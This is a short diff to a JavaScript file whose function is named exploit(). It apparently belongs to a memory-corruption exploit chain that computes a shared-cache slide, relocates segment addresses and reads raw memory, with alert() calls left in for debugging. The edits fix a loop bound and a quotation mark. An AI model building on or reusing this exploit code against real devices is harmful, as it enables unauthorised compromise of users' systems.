@@ -638,7 +638,7 @@ function exploit(){
             fail("base_seg");
         }
         var cache_slide = Sub(hdr, base_seg.addr);
-        for(var i = 0; i < segs.length; ++i)
+        for(var i = 0; i < nsegs; ++i)
         {
             segs[i].addr = Add(segs[i].addr, cache_slide);
         }
@@ -692,7 +692,7 @@ function exploit(){
             var fn = function(i)
             {
                 var g = memory.read(Add(straddr, i), 1);
-                alert("g”+g)
+                alert("g"+g)
                 alert("g[0]"+g[0])
                 return g;
 
